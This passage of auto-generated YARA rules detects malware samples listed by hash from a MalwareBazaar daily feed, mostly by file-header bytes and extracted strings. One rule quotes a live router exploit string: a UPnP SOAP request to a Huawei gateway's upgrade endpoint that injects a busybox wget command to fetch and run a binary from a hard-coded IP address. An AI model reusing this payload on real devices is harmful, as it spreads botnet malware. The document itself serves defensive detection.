        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0WWWWW"
        $s5 = "QQSVWd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 256KB
        and all of them
}

rule Windows_cce5686ff01c5d4248e87b002a345f6d7647d3aca7cc218e27dff28f90fec6b8
{
    meta:
        description = "Auto ML: cce5686ff01c5d4248e87b002a345f6d7647d3aca7cc218e27dff28f90fec6b8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ZXIS !"
        $s5 = "ZXIS \""

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5599KB
        and all of them
}

rule Windows_ccf9ab5f39684f978982e061fe87aacf71bca2b411f8a6e55d776bdc032b36d7
{
    meta:
        description = "Auto ML: ccf9ab5f39684f978982e061fe87aacf71bca2b411f8a6e55d776bdc032b36d7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = ";E$rjw"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1474KB
        and all of them
}

rule Linux_cd10ab58c8cb5119d76ebba24a76835da97587461b1b1f69dcb4dd5d93aff460
{
    meta:
        description = "Auto ML: cd10ab58c8cb5119d76ebba24a76835da97587461b1b1f69dcb4dd5d93aff460"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PP8iPP/"
        $s2 = "P}?KxH"
        $s3 = "xTc808c"
        $s4 = "kMWZ >"
        $s5 = "<`JR`c**H"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 85KB
        and all of them
}

rule Windows_cd2cc1403cb829e7d7454a3a80d9875834bd3b0837e56493369f2d842bf3f569
{
    meta:
        description = "Auto ML: cd2cc1403cb829e7d7454a3a80d9875834bd3b0837e56493369f2d842bf3f569"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "#Strings"
        $s4 = "IEnumerable`1"
        $s5 = "ToInt32"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 632KB
        and all of them
}

rule Windows_14b900286ac776a901ff3beb49507b83cb7902276d51c011360f837669ba7a66
{
    meta:
        description = "Auto ML: 14b900286ac776a901ff3beb49507b83cb7902276d51c011360f837669ba7a66"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "%N\"UUU@XV -"
        $s5 = "c UUUUj_"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6333KB
        and all of them
}

rule Windows_cd2e465d6a7fabbdb606645b710f24e2c3fbeb0860dc5e9d5d14f24e06e80c12
{
    meta:
        description = "Auto ML: cd2e465d6a7fabbdb606645b710f24e2c3fbeb0860dc5e9d5d14f24e06e80c12"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "community_from_a_psychology_event"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3811KB
        and all of them
}

rule Linux_cd389d7b7ca50eab09b8937f99b9b801664361a7fc6db8fc31e9eef8bac3bad6
{
    meta:
        description = "Auto ML: cd389d7b7ca50eab09b8937f99b9b801664361a7fc6db8fc31e9eef8bac3bad6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ";|$(t:WWj"
        $s2 = ";|$(t:PPj"
        $s3 = "usRRUh"
        $s4 = "D$&PVS"
        $s5 = "D$$PSV"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 86KB
        and all of them
}

rule Windows_cd4237029b627009d33bfcf33c18bb7823625d3ba56632196d239bcc03240b69
{
    meta:
        description = "Auto ML: cd4237029b627009d33bfcf33c18bb7823625d3ba56632196d239bcc03240b69"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4009KB
        and all of them
}

rule Linux_cd7082b1698cc23b04f5dcdac78a0ef1852c4629a0cd8491dba84545090baef1
{
    meta:
        description = "Auto ML: cd7082b1698cc23b04f5dcdac78a0ef1852c4629a0cd8491dba84545090baef1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<gd&sx"
        $s2 = "gCIGjj"
        $s3 = "/^Tlwx73"
        $s4 = "tyiAw$>)M"
        $s5 = "0Nty7U"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 34KB
        and all of them
}

rule Linux_cd8d3169c05096ae7cd78a155cf8953d6c809c4276b0517c5f783c6a8b0ed868
{
    meta:
        description = "Auto ML: cd8d3169c05096ae7cd78a155cf8953d6c809c4276b0517c5f783c6a8b0ed868"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "bLf>\"y"
        $s3 = "bLN^NuNV"
        $s4 = "OHWHQHy"
        $s5 = "/BQxHoQxB"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 82KB
        and all of them
}

rule Windows_cdc07215534b2a013cc2ab666d9a37eaebf478aa389489416159fd7034c2670d
{
    meta:
        description = "Auto ML: cdc07215534b2a013cc2ab666d9a37eaebf478aa389489416159fd7034c2670d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 915KB
        and all of them
}

rule Android_ce480d22d9936bc469d46abbcd51bdb74dc201216c29a97ba21c40e0299335bc
{
    meta:
        description = "Auto ML: ce480d22d9936bc469d46abbcd51bdb74dc201216c29a97ba21c40e0299335bc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AndroidManifest.xml"
        $s2 = "resources.arsc"
        $s3 = "res/drawable/curved_shape.xml"
        $s4 = "res/drawable/ic_empty.png"
        $s5 = "res/drawable/ic_settings.xml"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 4252KB
        and all of them
}

rule Windows_ce87fbd823460dbdbb143117bf228723562f9bc20650565e28da5a9d21442087
{
    meta:
        description = "Auto ML: ce87fbd823460dbdbb143117bf228723562f9bc20650565e28da5a9d21442087"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".sxdata"
        $s5 = "PSSSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7427KB
        and all of them
}

rule Windows_cea47650f92e6b73107d0eddc5e8e66ac5725fe1a0002ddc38b4f500fd15dfed
{
    meta:
        description = "Auto ML: cea47650f92e6b73107d0eddc5e8e66ac5725fe1a0002ddc38b4f500fd15dfed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0SSSSS"
        $s5 = "QQSVWh"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 337KB
        and all of them
}

rule Windows_cea50bb5162cb062f9c1bb03ce6a5d59b2247d0fbeec76e47948b1f90fe5f7cc
{
    meta:
        description = "Auto ML: cea50bb5162cb062f9c1bb03ce6a5d59b2247d0fbeec76e47948b1f90fe5f7cc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Harvest>d__10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15KB
        and all of them
}

rule Windows_14bf7a5b4420073171f0cb75ee7f7bbab035ec7a0695ff0f1493c1a648f29a5b
{
    meta:
        description = "Auto ML: 14bf7a5b4420073171f0cb75ee7f7bbab035ec7a0695ff0f1493c1a648f29a5b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 208KB
        and all of them
}

rule Linux_ceac6a6ec5576991f92a6c4ab49122dc8370922b3aa89d94956e5037dae6c100
{
    meta:
        description = "Auto ML: ceac6a6ec5576991f92a6c4ab49122dc8370922b3aa89d94956e5037dae6c100"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.224.128.187 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB
        and all of them
}

rule Android_ceb48e4b9d82b2ab7b486393048cdc78c6dfaf88799521e63677b06975f707cd
{
    meta:
        description = "Auto ML: ceb48e4b9d82b2ab7b486393048cdc78c6dfaf88799521e63677b06975f707cd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AndroidManifest.xml"
        $s2 = "versionCode"
        $s3 = "debuggable"
        $s4 = "extractNativeLibs"
        $s5 = "usesCleartextTraffic"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 1100KB
        and all of them
}

rule Windows_cec86acec6f99e92556452e64786682d8b76064ee7a2cc7515c44fae5297c1b6
{
    meta:
        description = "Auto ML: cec86acec6f99e92556452e64786682d8b76064ee7a2cc7515c44fae5297c1b6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 72722KB
        and all of them
}

rule Windows_cedd6842dc8e5b7b943cba42c7b1229e71963dfc5c47c52165947adb1287248b
{
    meta:
        description = "Auto ML: cedd6842dc8e5b7b943cba42c7b1229e71963dfc5c47c52165947adb1287248b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "uBhr4@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 240KB
        and all of them
}

rule Windows_cf40f8b049aa15ac55b805f7bc7f34de484cff02cbbdbcdb174d32b20088c2d3
{
    meta:
        description = "Auto ML: cf40f8b049aa15ac55b805f7bc7f34de484cff02cbbdbcdb174d32b20088c2d3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".rdata"
        $s4 = "P.reloc"
        $s5 = "P.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2080KB
        and all of them
}

rule Windows_cf51c50c01a1f91fd1dfbb0a4742ff9aad69417f0a7a95be0bb64d855b0dd5d9
{
    meta:
        description = "Auto ML: cf51c50c01a1f91fd1dfbb0a4742ff9aad69417f0a7a95be0bb64d855b0dd5d9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "pQ+4Us"
        $s4 = "NO5Tlu_"
        $s5 = "*tUT.Own"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4333KB
        and all of them
}

rule Linux_cf96a7979bc2003dbdc1024fc9936e26e934ea289a083353a15e390e4371f1d6
{
    meta:
        description = "Auto ML: cf96a7979bc2003dbdc1024fc9936e26e934ea289a083353a15e390e4371f1d6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PTRhv,"
        $s2 = ";|$(t:PPj"
        $s3 = "D$ XZj"
        $s4 = "9t$$tBPPj"
        $s5 = "T$`SSj"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB
        and all of them
}

rule Windows_d0088d5fbd159e1d0c51bd9a069382acb3d246a5f94bcd19bcd32897b85d91c1
{
    meta:
        description = "Auto ML: d0088d5fbd159e1d0c51bd9a069382acb3d246a5f94bcd19bcd32897b85d91c1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "fffff."
        $s5 = "\"fffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 580KB
        and all of them
}

rule Linux_d017b24236b688b833d99cf27b8782718acaa8a9ec56f0c59b3855e3a20b3f42
{
    meta:
        description = "Auto ML: d017b24236b688b833d99cf27b8782718acaa8a9ec56f0c59b3855e3a20b3f42"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "waY,D}8"
        $s2 = "g2(izX"
        $s3 = "%wRFH'"
        $s4 = "&l?CX,D5"
        $s5 = "k%p9Db"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 39KB
        and all of them
}

rule Windows_d05f38636d236314d40f22a27cddf777d00fb4fec5ee6d4fc569dba11e6f5861
{
    meta:
        description = "Auto ML: d05f38636d236314d40f22a27cddf777d00fb4fec5ee6d4fc569dba11e6f5861"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4758KB
        and all of them
}

rule Windows_150fb1285c252e2b79dea84efb28722cc22d370328ceb46fb9553de1479e001e
{
    meta:
        description = "Auto ML: 150fb1285c252e2b79dea84efb28722cc22d370328ceb46fb9553de1479e001e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "E0SVW3"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 102KB
        and all of them
}

rule Linux_d095a5f03d41cf3451aeb011b8ea46f1b0af1556d01cfee9b34c3df8b2fb483a
{
    meta:
        description = "Auto ML: d095a5f03d41cf3451aeb011b8ea46f1b0af1556d01cfee9b34c3df8b2fb483a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "SDv_4I"
        $s4 = "GqDq5S"
        $s5 = "Hq+vpW"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 46KB
        and all of them
}

rule Windows_d14a609c0c3757f80eec5475e599dd2804763620290a21076905d290524231a9
{
    meta:
        description = "Auto ML: d14a609c0c3757f80eec5475e599dd2804763620290a21076905d290524231a9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "#Strings"
        $s4 = "<SendMessageAsync>d__10"
        $s5 = "<handler>d__30"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 82KB
        and all of them
}

rule Windows_d18cdc223e2b6248fc289f6f4aeefd0369c34539f1a9e80aabab33de725c38fd
{
    meta:
        description = "Auto ML: d18cdc223e2b6248fc289f6f4aeefd0369c34539f1a9e80aabab33de725c38fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6344KB
        and all of them
}

rule Windows_d1cc9c3dfe7a71d641ead1f15911a697b5daa63a6a2ce7030a22d947d9847d91
{
    meta:
        description = "Auto ML: d1cc9c3dfe7a71d641ead1f15911a697b5daa63a6a2ce7030a22d947d9847d91"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "e7^E-@G#9p"
        $s5 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 341KB
        and all of them
}

rule Android_d23704d50be8827883847a2c325e78d04d27ffc55a0dcdac9d469e841f1d27ed
{
    meta:
        description = "Auto ML: d23704d50be8827883847a2c325e78d04d27ffc55a0dcdac9d469e841f1d27ed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AndroidManifest.xml"
        $s2 = "NxOmgJ"
        $s3 = "LKha=\\j"
        $s4 = "xv_gK*"
        $s5 = "j}\\AmZ"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 72503KB
        and all of them
}

rule Windows_d244f5129dd0da39e8808311b3fd46120f5ddd4aa4b67be258f8ef42a3a6dafa
{
    meta:
        description = "Auto ML: d244f5129dd0da39e8808311b3fd46120f5ddd4aa4b67be258f8ef42a3a6dafa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 76KB
        and all of them
}

rule Windows_d2553d836a160bed1332940033420852ed6f03e3565ef623575b222506800056
{
    meta:
        description = "Auto ML: d2553d836a160bed1332940033420852ed6f03e3565ef623575b222506800056"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADPK"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1133KB
        and all of them
}

rule Windows_d25bc39ea826dd2e4d5e112cd47f124d0739ccd8dafd90fe05fe9d039a65d90d
{
    meta:
        description = "Auto ML: d25bc39ea826dd2e4d5e112cd47f124d0739ccd8dafd90fe05fe9d039a65d90d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "c`XGR8"
        $s5 = "c`XGR8m"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4581KB
        and all of them
}

rule Windows_d27bb75e762a2867a82e1a009c6791157e8430619965a54cfb0279a560476a7b
{
    meta:
        description = "Auto ML: d27bb75e762a2867a82e1a009c6791157e8430619965a54cfb0279a560476a7b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5549KB
        and all of them
}

rule Linux_d2854fd43c283b3eb42d834af3eaf7aefd46353b17e23e368cb5aa47da6bcbd1
{
    meta:
        description = "Auto ML: d2854fd43c283b3eb42d834af3eaf7aefd46353b17e23e368cb5aa47da6bcbd1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 158KB
        and all of them
}

rule Windows_151d7008edac758ba7abc7236d3b5a0e4b5170f8b49fb4b1796acfa5118b5030
{
    meta:
        description = "Auto ML: 151d7008edac758ba7abc7236d3b5a0e4b5170f8b49fb4b1796acfa5118b5030"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = ".textbssW?"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 650KB
        and all of them
}

rule Windows_d2cf8156a14802cadeafc9cd7da63d7afec4648dee9b4ef17ed80cbb90da0d75
{
    meta:
        description = "Auto ML: d2cf8156a14802cadeafc9cd7da63d7afec4648dee9b4ef17ed80cbb90da0d75"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "pt Hu+j"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 44KB
        and all of them
}

rule Linux_d2fe71782616a730d38e437ad76327a5cbdc821a02d8cf910499ef781312cbfa
{
    meta:
        description = "Auto ML: d2fe71782616a730d38e437ad76327a5cbdc821a02d8cf910499ef781312cbfa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "X?stUPL"
        $s4 = "HKloSX"
        $s5 = "3_g rceg="

    condition:
        uint32(0) == 0x464c457f and
        filesize < 41KB
        and all of them
}

rule Windows_d2ff8bef72f7424016a3e20986a20ba4b790de32a6dd300b9e96b59f969ff735
{
    meta:
        description = "Auto ML: d2ff8bef72f7424016a3e20986a20ba4b790de32a6dd300b9e96b59f969ff735"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "u>ht~B"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 339KB
        and all of them
}

rule Windows_d32f66a04d255dbb2bfc6133ab9d6f30909602081f232370b3dab56aa7b2809f
{
    meta:
        description = "Auto ML: d32f66a04d255dbb2bfc6133ab9d6f30909602081f232370b3dab56aa7b2809f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "RQCWOIROIQJWZORIQOVITQNOCROIQWX"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "fffff."
        $s5 = "ffffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 417KB
        and all of them
}

rule Windows_d34e493e8e0dfa5e9a04ded3565e2ed4d60473148e63aeb3fca9a7f62dc90900
{
    meta:
        description = "Auto ML: d34e493e8e0dfa5e9a04ded3565e2ed4d60473148e63aeb3fca9a7f62dc90900"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "feffeefef"
        $s5 = "fefefeffe"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 558KB
        and all of them
}

rule Linux_d364cbdbfe2aeebf45a785f703255c05ec61d5f28e4ba255200f9ca9fea2f553
{
    meta:
        description = "Auto ML: d364cbdbfe2aeebf45a785f703255c05ec61d5f28e4ba255200f9ca9fea2f553"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 90KB
        and all of them
}

rule Linux_d3c1c6b9d6562722772c1d747067bec031bf3f8f04931fb1555afb6fc08ae35d
{
    meta:
        description = "Auto ML: d3c1c6b9d6562722772c1d747067bec031bf3f8f04931fb1555afb6fc08ae35d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "y$Qdl%"
        $s2 = "%od Nd"
        $s3 = "Sytm9$"
        $s4 = "xMxhYW"
        $s5 = "Uw+5pq"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Windows_d3e4f5863b1d06e57ee98bc50998d0addd25b93f86bb7f6aed8f7fa7d656b830
{
    meta:
        description = "Auto ML: d3e4f5863b1d06e57ee98bc50998d0addd25b93f86bb7f6aed8f7fa7d656b830"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2284KB
        and all of them
}

rule Linux_d3fe49ea723f09224615fb2bf15654135d0b0dde01c8572ae59104cb0a0a32e8
{
    meta:
        description = "Auto ML: d3fe49ea723f09224615fb2bf15654135d0b0dde01c8572ae59104cb0a0a32e8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
